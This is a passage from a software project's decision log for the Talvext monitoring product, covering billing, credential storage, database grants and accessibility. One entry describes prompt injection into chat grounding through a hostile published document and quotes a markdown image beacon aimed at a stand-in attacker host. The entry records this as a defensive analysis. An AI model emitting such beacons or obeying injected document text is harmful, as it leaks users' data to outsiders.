# Talvext — Decision Log

Architectural and process decisions, newest on top. Each entry records what
was decided, why, and what it affects. Add an entry when a choice constrains
future work; do not log routine implementation details.

---

## 2026-08-10 — Azure cost monitoring stores the first customer cloud credential, under the full BYOK posture

**Decided.** Azure cost monitoring (BRD F23, pulled forward from Phase 3)
connects a customer subscription through a service principal the admin mints
with one Azure CLI command, scoped to Cost Management Reader and nothing
wider. The client secret goes into the existing AES vault exactly like a
BYOK key: encrypted in the application layer before it reaches Postgres,
ciphertext withheld from the authenticated SELECT grant, decrypted only in
one service role module (src/lib/azure/credential-vault.ts, on the admin.ts
allowlist), never readable back through any surface, never logged. A
multi tenant OAuth connect button is deliberately not built; it is recorded
in docs/future_update.md as the someday upgrade.

**Decided: writes.** Connect, reconnect, and the monthly budget are
authenticated admin writes through RLS with column grants, the migration 007
idiom, so the audit triggers record the acting admin. The pull ledgers
(last_pull_at, last_pull_status, last_success_at) and the budget alert dedup
stamp (budget_alerted_for_month) hold no authenticated write grant at all,
the migration 017/020 posture: the sweep is their only writer, and an org
cannot forge freshness or replay an alert. Rollups (azure_daily_costs) are
service role written, admin read, and deliberately carry no foreign key to
the connection row: disconnecting deletes the credential and keeps the cost
history.

**Decided: the pull.** One attempt per subscription per UTC day, riding the
five minute sweep behind a last_pull_at due check; no new scheduler, no new
cron entry (the digest precedent). One token request plus one Cost
Management query per pull, no retries (the platform key resilience rule); a
failure stamps the ledger, shows as an honest staleness banner, and is never
an incident and never fails the sweep. The window re-covers the previous
month through today on every pull because Azure restates recent days as
metering settles; the rollup upsert is idempotent for the same reason. Reads
are admin only, both tables: spend is money data, scoped like billing, not
like uptime.

**Decided: packaging.** The feature is Business tier, expressed as a
cloudCosts boolean on the frozen plan matrix. There is no custom plan in the
resolver; Custom is sold as a Business subscription (the pricing page's
contact lane), so the boolean covers it. Free and Basic never store a cloud
credential: the connect action refuses before any write, and the sweep's
entitlement gate stops pulling the moment a plan lapses while leaving the
credential row intact.

**Affects.** Any future cloud provider port (AWS, GCP) inherits this shape
wholesale: the same vault, the same ledger posture, the same one pull a day,
the same disconnect-keeps-history rule. The audit vocabulary grew
azure_connected, azure_disconnected, azure_budget_changed, with the budget
amount never in the detail.

---

## 2026-08-07 — No single click moves money: the add on change confirms first, with Stripe's own numbers

**Decided.** The add on button on the billing screen is a link, not a
submit. It lands on a confirmation page (the release address idiom) that
shows what the change actually costs, fetched from Stripe's invoice preview:
the next invoice's real total with prorations included, and the recurring
monthly total after the change. Only the Confirm button submits the action
that edits the subscription. The preview is best effort: if the call fails,
the page renders the plain arithmetic and the confirm still works, because a
decorative number must never outrank the customer's intent.

**Why.** The first live test proved the problem: one click on Add AI Chat
changed the subscription immediately, and the first sight of the combined
$54 was on an invoice rather than on a screen asking permission. That is the
silent charge shape the frozen pricing's anti patterns forbid, arrived at
through UI rather than through the cap. A Stripe hosted checkout cannot fix
it, because Checkout creates subscriptions and cannot append an item to an
existing one; the confirmation therefore lives in the app, with Stripe
supplying the numbers.

**Affects.** Any future control that changes what an org pays inherits the
rule as stated in this entry's title: a click may open a page that asks, and
only a page that has said the real amount may carry the button that commits.

---

## 2026-08-07 — Subscription management: the portal is configured in code, the add on toggles in app, and Billing joins the nav

**Decided: the portal configuration is code.** What the Stripe customer
portal offers subscribers is a configuration object, and hand building it in
the dashboard is the same trap as hand building the catalog. It now lives in
src/lib/billing/portal-config.ts, the seed philosophy applied to the portal:
plan switching across exactly the three plan prices, cancellation at period
end (the subscriber keeps what they paid for; entitlements drop when the
deletion event lands), invoice history, card updates, and the real legal
pages linked. The portal action passes the configuration id explicitly and
creates the configuration when none exists, so the portal never depends on
whatever a dashboard default happens to be, and the seed script creates it
ahead of the first subscriber.

**Decided: the AI add on is managed in app, not in the portal.** Stripe's
portal cannot manage a second subscription item, so the add on would have
been unreachable after checkout. A toggle on the billing screen adds or
removes it on the live subscription with prorations, Basic and active only.
The WEBHOOK remains the one entitlement writer: the toggle edits the
subscription, the updated event lands the state, and the screen shows
pending until it does, exactly the checkout pattern. The screen also says
the one sharp edge out loud: with the add on attached, the portal cannot
switch plans, so remove it first.

**Decided: Billing joins the admin nav.** The settings rule (Settings is the
gear, the nav holds destinations) gets its one deliberate exception: the
billing page stays a settings tab by route, and admins also reach it from
the nav, because money deserves a first class door. Same page, two doors; no
route moved, so tests, links, and Stripe return URLs are untouched.

**Affects.** Changing what subscribers can do to their own subscription now
means editing portal-config.ts or the toggle action, both reviewed and both
pinned by tests/billing-portal.test.ts; the dashboard is never the place.
The entitlements resolver now exposes the subscription id for the toggle's
use. Everything stays inside the frozen pricing and the live gates of the
2026-08-07 F13 entry below.

---

## 2026-08-07 — Enforcement: BYOK always wins, the meter is the transcript, and the org gate is per person at first data access

**Decided: key precedence and the managed path.** When an org has any BYOK
key, chat runs on it: free, uncapped, never metered, exactly as before F13.
The managed path exists only for orgs with NO key whose plan includes
answers, runs on one platform key (Anthropic, `PLATFORM_ANTHROPIC_API_KEY`,
server only), and is metered per assistant answer. The escalation draft
stays BYOK only: a managed answer is something a person asked for, a draft
is decoration, and its existing deterministic fallback already covers the
keyless case.

**Decided: the meter is the transcript.** A managed answer is counted by the
chat_messages row that IS the answer (`key_source = 'platform'`, migration
024), bucketed by the org's one authoritative timezone, exactly as the F11
usage screen counts. No separate counter exists to drift or to reset: user
sessions hold no write verb on chat_messages, so the meter's inputs are as
unforgeable as the transcript. Two requests racing at the last included
answer can both land and write one answer over; the overage is absorbed,
never charged, because the recorded anti patterns (silent failure, automatic
upgrade, overage charges) outrank a one row overshoot. At the cap the send
path refuses with plain copy pointing at the Get Help ticket door, and the
chat surfaces say the same before anyone types.

**Decided: the digest gate lives in the sweep AND the settings.** The cron
sweep skips unentitled orgs before the due check and before the ledger
stamp, so a lapsed plan sends nothing even with a stale enabled flag, and
the morning an org upgrades, that day's digest still counts as owed. The
settings screen replaces the controls with the upgrade path for free orgs,
and the save action refuses a posted form the same way, in the same words.

**Decided: the monitor limit is enforced in the data layer.** The migration
003 insert policy is member wide on purpose, so a page level gate would
guard only the admin UI. `createMonitor` counts under the caller's own RLS
and refuses past the limit with upgrade copy. Deletion never blocks, and
alerts on existing monitors never pause: limits are packaging, not
capacity.

**Decided: the org allowance is per person, enforced at first data access.**
Clerk owns org creation end to end (hosted widgets, no pre creation server
hook), and its webhook fires after the org exists, where a refusal only
makes Clerk retry forever. So the seam the spec preferred cannot express
the rule, and the recorded fallback applies: the dashboard layout checks
the viewer's allowance (the highest orgLimit across every org they belong
to, so Business staff inherit ten from the Business org's membership) and
shows a clear screen in place of the page for memberships past it, oldest
memberships first. Nothing is deleted; other members are unaffected; the
switcher remains reachable. The single org majority costs one extra count
query per dashboard render. Said precisely: this is packaging enforcement,
not a security boundary. The viewer is a legitimate member of the org, the
page's own server render may still execute beside the layout, and RLS
remains the boundary for what any session can read; the screen gates use of
the product, which is what a plan limit is.

**Known gap, recorded not improvised: Business sibling orgs resolve free
entitlements.** The pricing sells Business as ten organizations with
everything in Pro, but entitlements are resolved per org and the other nine
orgs have no billing row, so today they resolve as free tier. Linking
sibling orgs to a Business subscription (a billing group) is its own task
and a blocker on SELLING Business, recorded here so the gap is a decision
and not a surprise. Test mode makes this safe to ship now.

**Affects.** The chat surfaces, the sweep, monitor creation, and the
dashboard layout all read the one resolver. The M4 audit item is closed:
the org level ceiling exists and is the entitlement. PR 4's pricing page
states nothing this entry does not already enforce or record.

---

## 2026-08-07 — The billing screen: admin gated for v1, the success redirect is never trusted, and clickwrap is live

**Decided: billing is admin gated, owner activation is deferred.** The
billing tab uses the same requireAdmin gate as every settings surface, so
any org admin can subscribe, open the portal, and cancel. The BRD's owner
role exists in the vocabulary (org_members.role) but is assigned nowhere in
app, and giving billing an owner only gate would first require in app role
management for promoting someone to owner. That is its own task; shipping
billing behind a role nobody can hold would ship billing nobody can use.
When owner management exists, tightening the gate is a one line change in
one place.

**Decided: the webhook is the entitlement authority; the redirect is a
hint.** After Stripe Checkout sends the browser back with `checkout=success`
the screen does not upgrade anything. It renders whatever
`org_billing` says, and while the webhook has not landed it says pending and
refreshes itself briefly (bounded, then degrades to a static page). A forged
or replayed success URL therefore changes nothing: the only writer is the
signature verified webhook.

**Decided: clickwrap is live, org level, versioned by effective date.** The
checkout action refuses to create a Stripe session until the acceptance
checkbox arrives with the form, then records `clickwrap_accepted_at` and
`clickwrap_terms_version` on the org's billing row BEFORE the session is
created. The version is the terms' effective date, exported as
`TERMS_EFFECTIVE` next to the document itself and cross checked by test
against the date written inside it. Acceptance is recorded against the org,
the entity that pays, by an admin acting for it, which is what the terms
themselves say acceptance on behalf of an organization means. This
discharges the 2026-08-03 browsewrap entry's debt on schedule: clickwrap
arrived with billing.

**Affects.** The first paid plan is unblocked legally (with attorney review
retired per the entry below). Owner activation is a named future task, not
an accident of omission. PR 3 builds enforcement on the same resolver this
screen renders from.

---

## 2026-08-07 — F13 billing: the pricing is frozen, Stripe runs under the agency account in test mode, and attorney review is retired as a launch gate

**Decided: the pricing.** Five tiers and one add on, frozen here; a change to
any number below is a pricing decision that supersedes this entry, never a
code cleanup.

- **Free**: 1 organization, 2 monitors, tickets, incident alerts, BYOK chat.
  Alerts are ungated forever on EVERY tier; a monitoring product that holds
  an outage notification hostage is the anti pattern this line forbids.
- **Basic, $39/month**: 1 organization, 15 monitors, status page, daily
  digest, SSL expiry warnings, maintenance windows. The copy says "for
  offices up to around 20 staff"; the staff count is marketing language and
  is NEVER enforced. Seats are never metered anywhere in the product.
- **Pro, $79/month**: 1 organization, everything unlimited (documents with
  audience targeting, inventory, audit log, unlimited monitors), plus 300
  managed AI answers per month included.
- **Business, $199/month**: up to 10 organizations, everything in Pro, AI
  included; described as managing every client or location from one account.
  The word MSP does not appear in customer copy.
- **Custom**: contact us (a mailto for now), no price shown.
- **AI Chat add on, $15/month**: 300 managed answers, attachable to Basic
  only; Pro and Business already include the allowance.

**The cap behavior, recorded as anti patterns.** Hitting the managed AI cap
degrades to the Get Help ticket door with plain copy. Never a silent failure,
never an automatic upgrade, never overage charges. BYOK chat remains free and
uncapped on every tier; the cap governs the platform key path alone. This
lands the org cost ceiling the August audit called M4 and the 2026-08-06
entry below deferred to this design: the ceiling is the entitlement, enforced
in F13 PR 3 against the F11 counters, authoritative in the database.

**Decided: the Stripe account.** Talvext bills under the Simsim agency Stripe
account rather than a fresh one. What makes that presentable is the statement
descriptor: it is set to TALVEXT in the Stripe dashboard by hand, so a
customer's card statement names the product they bought, not the agency. That
dashboard click is a human act and one of the live gates below.

**Decided: live mode is a human switch, and everything in this repo is test
mode.** The code, the seed script (scripts/stripe-seed.ts refuses a live key
outright), the webhook, and every checked in key name run against Stripe test
mode. Going live requires, in order: the clickwrap gate shipped and working
(F13 PR 2), the TALVEXT statement descriptor set in the dashboard, and an
explicit operator go ahead. No code path, cron, or migration flips any of
those; they are decisions a person makes.

**Superseding: attorney review is retired as a launch gate.** The 2026-08-03
legal pages entry made signing a customer contingent on professional review
of the terms. That contingency is lifted as a deliberate, recorded risk
acceptance: LLC formation is the operative protection being pursued, and the
review may happen someday, but it no longer blocks taking payment. What does
NOT change: the transparency note on /terms and /privacy stays exactly as
written until a review actually happens (its own entry stands), and the
clickwrap requirement from the browsewrap entry is unchanged and becomes real
in F13 PR 2. Honesty about the review's absence is the mechanism that makes
its retirement as a gate tolerable.

**Also decided, the schema posture.** Entitlements live in `org_billing`,
webhook written on the service role like the Clerk sync, admins read their
own org's row, no user session holds a write verb, and an org with no row is
free tier by definition (migration 022). Clickwrap acceptance is recorded on
the org's billing row, the entity that pays, before any checkout session is
created. Effective entitlements resolve through
`src/lib/billing/entitlements.ts` and nowhere else.

**Affects.** F13 PRs 2 through 4 inherit all of it: the billing screen and
checkout (clickwrap before session, webhook as the entitlement authority),
enforcement (the degrade behaviors above), and the public pricing page (which
ships unlinked until the live gates pass). The 2026-08-06 M4 deferral below
is resolved by this entry.

---

## 2026-08-06 — Plain text chat rendering is a load bearing security control, and the org cost cap waits for Stripe

**Decided.** The assistant's output renders as plain React text nodes in every
chat surface, and that is now a security invariant, not a styling choice.
Adding rich rendering (markdown, HTML, autolinking, clickable anything) to chat
bubbles later is a SECURITY REDESIGN requiring a fresh exfiltration analysis,
not a styling change. `tests/chat-plain-text-render.test.ts` is the guard: it
renders hostile assistant output through the real transcript component and
fails the build if a script tag, an image, a link, or markdown emphasis ever
comes out as markup instead of escaped text, and it fails if any chat surface
imports interpretation machinery.

**Why.** The August audit (docs/AUDIT_2026_08.md, M1) established that chat
grounding is injectable by a hostile published document: the boundary between
instructions and reference text is a sentence an author can restate, so a
compromised admin can steer what the assistant says. The reason that caps out
at social engineering instead of automatic data exfiltration is the render:
the standard RAG exfiltration primitive is a markdown image beacon
(`![](https://attacker/?d=...)`) that fires a request the moment the reply
renders, and in Talvext it renders as literal characters a human would have to
retype. That property arrived as a by product of the non streaming plain text
design; nothing protected it, which meant a well meaning "make chat prettier"
PR could silently convert M1 from a content problem into a data exfiltration
channel. Now the property is named, tested, and owned.

**Also decided: the org level chat cost cap (audit M4) is deliberately
deferred to the Stripe entitlement design (F13).** A real spend ceiling is an
entitlement question: what an org is allowed to consume is exactly what a plan
defines, so building a standalone cap now would be redone the moment billing
exists. The per user throttle (30 per minute per org user, now covering the
escalation draft path too) remains the interim guard, with its per instance
limitation recorded in the 2026-07-30 rate limits entry. The deferral is a
choice, not an oversight: revisit it in the F13 design conversation before any
paid tier ships.

**Affects.** Any future chat UI work: rich rendering proposals start from the
exfiltration analysis, not from CSS. The F13 design conversation inherits M4.
The audit's remaining accepted items (CSP as a separate task, the
REFRESH_TOKEN_SECRET removal as an operator action) are tracked in
docs/AUDIT_2026_08.md, not here.

---

## 2026-08-04 — The monitors write grants are column scoped, and sweep state is sweep owned by grant

**Decided.** Migration 020 (certificate expiry alerts) converts the
authenticated write grants on `monitors` from table wide to column lists:
insert reaches `org_id, name, url, interval_seconds, active`, update reaches
`name, url, interval_seconds, active`, and nothing else. The immediate
reason was the two new certificate columns, `cert_expires_at` and
`cert_alerted_threshold`, which are sweep owned ledgers no user session may
write. But the conversion carries a deliberate side effect worth its own
entry: `last_status`, `last_checked_at`, and `failing_since`, which had
been service role territory by convention only since migrations 003 and
004, are now service role territory by grant.

**Why it matters.** Until now, a compromised or misused app role
credential, any authenticated session, could write `last_status = 'up'` on
its own org's monitors and the dashboard would repeat the lie. Monitor
status is telemetry the product vouches for, and after this change the
database refuses the forgery with a privilege error instead of trusting
the caller. The same argument covers the certificate columns from birth: a
writable expiry would let a user fabricate warnings, a writable ledger
would let one replay or suppress them.

**What it constrains.** Any future column on `monitors` that user sessions
should write must be added to the grant lists explicitly; nothing is
inherited from the table any more. That is the point: the writable surface
of the table is now a statement in the migration, not a default. The
pattern is the one migration 017 set on `org_notification_settings`
(`digest_last_sent_on`), and the isolation suite proves both the refusals
and the survival of the legitimate write shapes.

---

## 2026-08-04 — Reversal, same day: the Cloudflare proxy is off, talvext.com is DNS only

**Decided.** This supersedes the entry below it. `talvext.com` resolves
directly to Vercel: both Cloudflare records are DNS only, and the proxy
layer is deliberately off. The orphaned `chat-api-limit` rule is deleted
rather than left showing Active, per the rule the earlier entry itself
states: protection that looks on but is not is worse than none.

**Why the reversal.** The layers that actually fit the risk were already in
place before the proxy: the spend bearing path (chat) sits behind sign in
and an org's own provider key, the application limits every user to 30
messages a minute, and Vercel's baseline DDoS mitigation fronts everything.
The one thing the proxy added on the free plan, a single edge rate limiting
rule, never passed its burst acceptance check, and a day of configuration
attempts produced an unconditional block rule (deleted before it could break
chat) and a rule that matched nothing. An unverified edge rule is exactly
the coverage that does not exist, and the proxy's standing costs (a
permanently misconfigured domain check in Vercel, a foreign edge
certificate, a Bot Fight Mode trap waiting for the Clerk webhook) bought
nothing real in exchange.

**What survives from the superseded entry.** Machine traffic still targets
`talvex-chi.vercel.app` directly: that rule was defense against anything
sitting in front of the domain, and it stays true whether anything does.
Clerk's future DNS records still must be DNS only, because the zone still
lives at Cloudflare and its records default to Proxied. Bot Fight Mode
stays off.

**If the proxy ever comes back** (real observed abuse is the trigger, per
the rate limiter's own header comment), the superseded entry below is the
checklist: Full strict TLS, the burst acceptance check before any edge rule
is trusted, and the webhook already out of the blast radius.

---

## 2026-08-04 — The Cloudflare proxy stays in front of talvext.com

**Decided.** `talvext.com` is served through the Cloudflare proxy (orange
cloud), not DNS only, because the free edge layer buys what the application
cannot provide: distributed rate limiting and DDoS absorption in front of
Vercel. The in memory limiters (chat at 30 a minute per user, status and
health at 60 a minute per IP) are per server instance by design and their own
header says they do not stop a distributed attack; the edge does.

**The settings the proxy requires:**

- SSL/TLS mode **Full (strict)**. Flexible loops against Vercel and plain
  Full accepts any origin certificate. Verified externally 2026-08-04: apex
  200, `www` 308 to the apex, health and legal pages serving.
- The free plan's single edge rate limiting rule goes to `/api/chat` (more
  than 10 requests in 10 seconds per IP, block), because chat is the only
  surface that spends money per request. **Its acceptance check is a burst
  test: 15 rapid requests against `/api/chat` must end in Cloudflare 429s.
  As of this entry the deployed rule fails that check** (the path value
  appears to carry a trailing space, so it matches nothing), which means it
  counts as no protection until a burst passes; the application's own
  limiters stand alone meanwhile. A rule that shows Active while matching
  nothing is worse than none, so it gets repaired or deleted, never left.
- **Bot Fight Mode stays off.** On the free plan it applies globally and no
  rule can exempt a path. Turned on, it would challenge Clerk webhook
  deliveries after the production migration, which does not error, it
  silently stops org sync: the `docs/DEPLOY_LOG.md` Fault 2 shape.

**The standing rule that makes the proxy safe: machine traffic never crosses
it.** The cron scheduler, the external watcher, and the future Clerk
production webhook all target `talvex-chi.vercel.app` directly, so no
challenge, cache, or edge rule can ever sit between the platform and its own
machinery. The runbook's section 7 records this for the webhook step.

**Accepted costs.** Vercel's domain check reports talvext.com as
misconfigured forever (it cannot see through the proxy), the browser shows a
Cloudflare edge certificate rather than a Vercel one, and every future DNS
record on the zone, including Clerk's CNAMEs, must be created DNS only
because Cloudflare defaults to Proxied.

---

## 2026-08-03 — Renamed to Talvext, and the naming rule that makes it the last rename

**Decided.** The product is named Talvext, the third and final name after
Telvix and Talvex. Every user facing surface renames in one coordinated pass:
code and copy first, then docs and legal pages with a word level diff proof,
then screenshots retaken from the live app. Records stay as written: git
history, closed PR titles, dated entries in this log and in
`docs/DEPLOY_LOG.md`, database identifiers, migration filenames, and env var
names.

**Why.** The Talvex domain space was economically closed and increasingly
crowded: `talvex.com` is held by an unrelated Swiss firm, a UK company named
Talvex Limited was newly registered, and Talvix, an active AI software
company, sits one letter away. Talvext verified collision clean in software,
and `talvext.com` was purchased at standard price on 2026-08-03.

**The naming rule, so there is no fourth rename.** Availability and collision
checks precede attachment to any name. A name is not adopted until its domain
is confirmed purchasable at standard price and a search shows no active
software company within trivial edit distance.

**Affects.** The BRD keeps the name Talvex and carries one preface line noting
the rename; it is the founding record. The Resend sending domain stays on
`islamelsayed.net` until email on the new domain is its own decision; only the
display name and subject prefix changed. The self monitoring org's status page
slug moves to `talvext` as a manual step recorded in `docs/RUNBOOK.md`.

---

## 2026-08-03 — Two verification gaps, found the hard way, now working rules

Both of these came out of the accessibility pass (#57, #58). Neither is a
preference; each is a case where a check reported green over something broken.

**A CSS change is not verified until `npm run build` has run.** `tsc` and
`eslint` parse no CSS. A comment edit in `globals.css` left prose outside its
`/* */`, both tools reported clean, and every route returned 500 until the next
build. The failure mode is specific and repeatable: the two checks that run
fastest are exactly the two that cannot see a stylesheet, so "typecheck and
lint pass" reads as verified when nothing has looked at the CSS at all. Any
change touching a stylesheet runs a build before the word green is used. Now
CLAUDE.md rule 15.

**A keyboard pass is a standing part of accessibility verification.** axe
checks contrast, structure, names, and roles. It does not check whether a
focus indicator exists. The Clerk org switcher and user button were rendering
at `outline: 0px none` on pages axe had already passed, because the layer order
put Clerk's styles after our base rule. Tabbing through found it in seconds;
the gate could not have found it at all, and adding more axe rules would not
change that. The gate is necessary and it is not sufficient. Now CLAUDE.md
rule 16, and `tests/e2e/accessibility.spec.mjs` carries the keyboard section
that encodes it.

**The shape of both.** A passing check answers the question it was built to
ask, which is never the same as the question "is this correct". Worth knowing
what each tool is structurally blind to before quoting its output as proof.

---

## 2026-08-03 — The focus ring is a global rule that CSS cannot defend, so a test does

**Decided.** One focus ring: `--focus-ring`, `--focus-ring-width` (2px),
`--focus-ring-offset` (2px), applied through a single `:focus-visible` rule in
the base layer. `outline-none` is banned from the codebase, and
`tests/a11y-foundation.test.ts` fails if it reappears.

**Why the ban rather than a stronger selector.** The layer order declared at the
top of `globals.css` is `theme, base, clerk, components, utilities`. Tailwind's
`outline-none` lands in `utilities`, which comes last, so it beats the base rule
no matter how that rule is written. There is no selector that wins this. The
rule genuinely cannot defend itself, so the only enforcement that holds is a
test that reads the source. Six field classes carried `outline-none` before
this, which is why most of the app had no visible focus at all.

The same layer order bites twice: Clerk's injected styles sit in `clerk`, also
after `base`, so the org switcher and user button had no ring either. That
needed the rule restated in `components`, which does come after `clerk`. The
keyboard pass is what found it, reporting two buttons at `outline: 0px none`;
the axe scan had passed those same pages, because axe does not check that a
focus indicator exists.

**Decided alongside.** `:focus-visible` rather than `:focus`, so a mouse click
does not leave a ring but a Tab does. A 2px offset, because putting page color
between the element and the ring is what makes it legible on a dark UI.

**Affects.** A component may restyle the ring. It may not remove it. Anything
reaching for `outline-none` needs a different answer, and any styling layer
added after `components` inherits the same trap.

---

## 2026-08-03 — Status has a shape vocabulary, because color is not a channel we own

**Decided.** Every status indicator is a shape as well as a color, and the five
shapes are fixed:

| tone | shape | meaning |
| --- | --- | --- |
| up | filled circle | operational, resolved, published, connected |
| down | filled diamond | down, open incident |
| pending | hollow ring | waiting, unknown, draft, open ticket |
| active | filled square | in progress; the accent, not a status color |
| paused | short bar | paused, canceled, not connected; neutral |

They live in one place, `src/components/status-mark.tsx`, and every badge in
the app renders through it. The mark is always `aria-hidden`; the text label
beside it is what assistive technology reads, which is why `StatusText` pairs
the two and is the shape callers reach for.

The status page heatmap gets the same treatment in CSS: a clean day is solid,
partial downtime is diagonal stripes, a down day is tighter stripes at the
opposite angle, and a legend names all four.

**Why.** `/accessibility` says status is "always conveyed by text and icons,
never by color alone." That was a present tense claim the app did not meet.
Every indicator was the same circle in a different color, so the mark carried
nothing and the state rested entirely on whatever text happened to sit beside
it. On the public status page there was no such text: a client looking at their
dentist's status page saw a green or red dot and nothing else, and ninety days
of history was three shades of one rectangle. A red/green color blind visitor
could not read the page at all.

Shipping a public accessibility statement and then not meeting it is worse than
not shipping one, so the claim was made true rather than softened.

**Guarded, and the guards were proved.** `tests/status-color-alone.test.ts`
asserts the five silhouettes stay distinct, that up and down never collapse to
the same shape, and that the two heatmap patterns keep different stripe angles.
`tests/e2e/status-page.spec.mjs` asserts against a real page that every monitor
row names its state in words, that downtime cells carry a pattern, and that
every mark is `aria-hidden`. Both guards were checked by breaking the thing
they protect and watching them fail; a test that cannot fail proves nothing.

**Affects.** A new status anywhere maps onto one of these five tones or the
vocabulary grows deliberately, here, with a shape nobody else uses. Reaching
for a bare colored dot is the failure this entry exists to prevent. The tones
also respect the reserved palette: `paused` and `active` never touch a
`--status-*` token, because paused is not a status and in progress is the
accent.

---

## 2026-08-03 — The unreviewed status is disclosed on the public legal pages

**Decided.** The terms of service and the privacy policy both open with a
transparency note, rendered as a callout at the top of the public page:

> **Transparency note:** These terms were prepared with AI assistance and have
> not yet been reviewed by an attorney. They are the agreement that governs use
> of the Service while it is free, and they will be updated when professional
> review is complete.

It is not stripped on the way to production. It comes out when a licensed
attorney has actually reviewed these documents, and not before.
`tests/legal-pages.test.ts` fails if it disappears, and checks the admission
itself rather than the label, so a note that kept the heading and lost the
sentence would not pass.

**Why.** The documents say what they are. Publishing them with that disclosure
deleted would present an unreviewed AI drafted agreement as a settled one,
which is a misrepresentation to every visitor who reads them, and it would also
remove the only standing reminder that the review has to happen. Nothing about
Talvex today needs the pretence: the product is free, there are no paying
customers, and the terms make the review a precondition of taking payment.

**The wording was chosen, and the first attempt was wrong.** The documents
arrived carrying a drafting instruction: "DRAFT FOR ATTORNEY REVIEW. This
template was prepared with AI assistance and is not legal advice. Have a
licensed attorney review it before publishing." That was published as written,
which was the wrong call in one respect. It was addressed to the person
building the site, not to the reader, and it told visitors the agreement
governing them was a draft, which is not accurate: these terms do govern use of
the free Service today. The replacement discloses exactly the same fact, that no
attorney has reviewed this, in language written for the person reading it. The
honesty is the requirement; the phrasing was not.

**Affects.** Deleting the note is a deliberate act gated on real legal review,
not a cleanup, and the effective date changes when it goes. It pairs with the
browsewrap entry below: the note and the missing clickwrap come off the board
at the same moment, when there is money involved. The terms also name New York
law, a HIPAA position, and a liability cap, none of which have been reviewed by
anyone qualified; signing a customer, especially a dental or medical practice,
is blocked on that review.

---

## 2026-08-03 — Browsewrap acceptance for the free period; clickwrap arrives with billing

**Decided.** The sign in screen carries a notice, not a gate. Below the Clerk
widget one line of muted text reads "By continuing you agree to the Terms of
Service and Privacy Policy", with both phrases linked to `/terms` and
`/privacy`. There is no checkbox, and no acceptance timestamp is stored.

Clickwrap replaces it before Talvex takes money: an explicit checkbox, the
document version the user accepted, and a stored timestamp against the user
record. That work belongs with billing in Phase 1, not before it.

**Why.** Browsewrap is the weaker instrument, and the weakness is real: an
agreement nobody clicked is harder to enforce, and courts have declined to
enforce it where the notice was not conspicuous. It is accepted here anyway,
for the free prelaunch period only, on two grounds. There is no transaction to
dispute, so the practical exposure during this period is close to nothing. And
storing an acceptance record properly means deciding what a version of a
document is and where consent lives, which is the same schema question billing
forces anyway. Doing it once, with billing, beats doing it twice.

The notice itself is not a placeholder for that work. Conspicuous notice
adjacent to the action is what makes browsewrap defensible at all, so the line
sits directly under the button the user is about to press, not in the footer.

**Affects.** Whoever builds billing inherits this: clickwrap is a blocker on
the first paid plan, not a nice to have alongside it. The acceptance record
needs a document version, so the legal documents need versioning at the same
time. Until then, `/terms` and `/privacy` must stay reachable while signed out,
which is why `tests/auth-routes.test.ts` now asserts the legal routes are
public.

---

## 2026-08-03 — The legal pages are dark, because the product has no light theme

**Decided.** `/terms`, `/privacy`, and `/accessibility` render in the same dark
palette as the rest of the app. The task that specified them asked for a light
theme "matching the status page and client help flow default". That premise is
out of date and was not followed.

**Why.** Light mode was removed on 2026-07-25 (see that entry). `data-theme="dark"`
is hardcoded on `<html>` in the root layout, `globals.css` carries a single
palette with no light override, and `tests/design-tokens.test.ts` fails the
build if one appears. The status page named as the light reference is itself
dark and has been since it shipped. Building these three pages light would have
meant reintroducing a second theme, and a decision that a task prompt did not
know it was making is the wrong way to reverse a locked one.

**Affects.** Any future task prompt that reasons from a light status page is
working from the same stale premise and should be checked against this entry
before it is implemented. If light mode ever returns it returns deliberately,
through the design system, and these pages follow it rather than leading it.

---

## 2026-08-03 — A branch is cut from main and proved so, and a stray file in a diff stops the PR

**Decided.** Two mechanical checks join the working conventions, both cheap,
both aimed at the same failure:

1. **A feature branch is cut from `main`, and `git log` immediately after
   creation proves it.** Not assumed from where the working copy happened to
   be standing.
2. **A pull request whose file list contains anything outside its task stops
   for a base check before it is opened.** An unexplained file in a diff is
   treated as evidence the branch point is wrong, not as a stray to tidy later.

**The case that produced them.** `docs/DEMO.md` reached main inside pull
request #53, the ticket lifecycle. The lifecycle branch was created with
`git switch -c` while the working copy was still on `docs/demo-script`, so it
was cut from that branch rather than from main and carried the demo script
along. The squash merge put both on main. The demo script was one of 21 files
in that pull request and went unnoticed in the list.

**Why that is worse than an untidy diff.** The demo script had an open pull
request of its own, #52, awaiting review. Merging #53 landed it **without the
review it was queued for**, which is the one process rule this repository has
no exceptions to. #52 became an empty pull request whose content was already
upstream, and nobody looking at either pull request would have seen why.

It also shipped a false claim. `docs/DEMO.md` beat 7 instructed a presenter to
say aloud that tickets are not in the audit log, which migration 019 had made
untrue in the same merge. That was caught only because the next task began by
checking whether #53 had invalidated anything in #52. Nothing mechanical would
have caught it.

**Why mechanical checks rather than more care.** The mistake is invisible at
the moment it is made: `git switch -c` succeeds, the diff against the wrong
base looks plausible, and every subsequent command behaves normally. Care does
not catch a thing that produces no symptom. Two seconds of `git log` does.

**Affects.** Every branch from here. The second check is the one that would
have caught this one, because the file list was on screen and the demo script
was in it. If a stray file ever turns out to be legitimate, that is an argument
for splitting the pull request, not for waiving the check.

---

## 2026-07-31 — The ticket lifecycle: closed is retired, and members get a write path that is not an update

**Decided.** Migration 019 gives a requester real control over their own
ticket. Statuses become `open`, `in_progress`, `resolved`, `canceled`.
**`closed` is gone, and the 7 day auto close sweep that produced it is deleted.**
This supersedes the Task 3 lifecycle ruling recorded in migration 005 and
referenced by the 2026-07-27 external scheduler entry, which counted ticket
auto closes among the things that tightened to a 5 minute cadence. There is
nothing left to tighten; that step no longer exists.

**Why closed could not stay.** Migration 005 made closed final: the lifecycle
trigger raised on any transition out of it. The sweep closed every resolved
ticket after 7 days. Put a Reopen button in front of a requester and those two
facts collide: the button works for at most a week and then starts refusing,
and the person is told their own request is final by a sweep they never saw and
cannot appeal. Closed's real job, getting settled tickets out of the way, is
done better by `hidden_by_requester` plus a 7 day window, because those hide
without freezing. **`in_progress` stays**, against the first draft of this
work, because it is genuine admin signal and live tickets use it; the terminal
pair is `resolved` and `canceled`, and neither is locked for an admin.

**Canceled is a withdrawal, not a failure**, and that reading shows up in three
places: it wears the muted neutral rather than red, it sorts last rather than
being hidden, and it is terminal for the requester. A problem coming back is a
new ticket. The alternative, letting a member un cancel, was rejected because
it makes withdrawal meaningless and gives the trail a second story about the
same request.

**The member write path is two SECURITY DEFINER functions, and this is the
part worth reading.** The requirement was a state machine: open or in_progress
to resolved, open or in_progress to canceled, resolved to open, nothing else.
**RLS cannot express that.** An UPDATE policy evaluates `using` against the old
